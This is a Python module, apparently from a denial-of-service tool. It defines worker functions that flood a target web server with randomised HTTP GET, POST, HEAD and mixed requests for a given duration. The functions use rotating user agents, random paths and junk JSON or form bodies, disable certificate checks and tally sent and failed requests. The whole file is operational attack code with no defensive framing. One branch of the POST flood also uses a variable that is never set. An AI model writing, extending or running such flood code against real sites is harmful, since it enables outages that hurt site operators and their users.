# import modules
import socket
import requests
import time
import json
from random import randint, choice

# import depencies
from src.utils import *
from src.core import *

# disable "InsecureRequestWarning"'s
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def http_get(worker_id, session, target_url, attack_duration, useragent=None, referer=None, target_port=None):
    '''
    HTTP GET flood
    '''

    if target_url is None: # target_url is a required arg
        return False

    time.sleep(5) # wait for other threads to spawn

    if target_port is None:
        target_port = '443' if target_url.startswith('https://') else '80'

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.get(f'{target_url}:{target_port}/{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1

    Core.threadcount -= 1

def http_post(worker_id, session, target_url, attack_duration, useragent=None, referer=None, target_port=None, post_data=None):
    '''
    HTTP POST flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    if target_port is None:
        target_port = '443' if target_url.startswith('https://') else '80'

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            headers = buildheaders(target_url, useragent, referer)

            payload_choice = randint(0,2)
            if payload_choice == 1: # json payload
                json_data = {}
                for _ in range(10):
                    if randint(0,1) == 1: json_data.update({randstr(randint(5, 20)): randstr(40, 60)})
                    else: json_data.update({randstr(randint(5, 20)): {choice(keywords): choice(keywords)}})

                data = json.dumps(json_data)               
                headers.update({'Content-Type': 'application/json', 'Content-Length': str(len(data))})
            elif payload_choice == 2: # url encoded payload 
                url_encoded_data = f'{choice(keywords)}={choice(keywords)}'

                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                data = url_encoded_data

            session.post(f'{target_url}:{target_port}/{buildblock(target_url)}', headers=headers, data=data, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1

    Core.threadcount -= 1

def http_fast(worker_id, session, target_url, attack_duration, useragent=None, target_port=None):
    '''
    basic GET / flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    if target_port is None:
        target_port = '443' if target_url.startswith('https://') else '80'

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.get(f'{target_url}:{target_port}/', headers={'User-Agent': choice(ualist) if useragent is None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1

    Core.threadcount -= 1

def http_head(worker_id, session, target_url, attack_duration, useragent=None, target_port=None):
    '''
    Basic HEAD flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    if target_port is None:
        target_port = '443' if target_url.startswith('https://') else '80'

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.head(f'{target_url}:{target_port}/{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent is None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1

    Core.threadcount -= 1

def http_ghp(worker_id, session, target_url, attack_duration, useragent=None, referer=None, target_port=None):
    '''
    GET/HEAD/POST flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    if target_port is None:
        target_port = '443' if target_url.startswith('https://') else '80'

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            method_choice = randint(0,2)
            if method_choice == 0: session.head(f'{target_url}:{target_port}/{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent is None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)
            elif method_choice == 1: session.get(f'{target_url}:{target_port}/{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
            elif method_choice == 2: # url encoded data flood only
                url_encoded_data = f'{choice(keywords)}={choice(keywords)}'

                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                session.post(f'{target_url}:{target_port}/{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=url_encoded_data, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1

    Core.threadcount -= 1